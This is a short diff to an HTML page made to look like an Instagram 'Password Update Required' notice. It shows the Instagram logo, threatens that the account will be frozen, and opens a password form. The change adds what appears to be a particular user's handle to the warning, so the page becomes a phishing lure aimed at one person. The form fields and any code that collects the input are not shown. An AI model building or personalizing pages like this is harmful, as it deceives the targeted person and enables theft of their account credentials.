@@ -15,7 +15,7 @@ Be Aware
     <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="insta-logo">
     <h2>Password Update Required</h2>
     <div class="alert">
-      To avoid freezing your Instagram account, please update your password as soon as possible.
+      To avoid freezing your Instagram account, naina_devadiga_ please update your password as soon as possible.
     </div>
     <form>
       <div class="input-group">
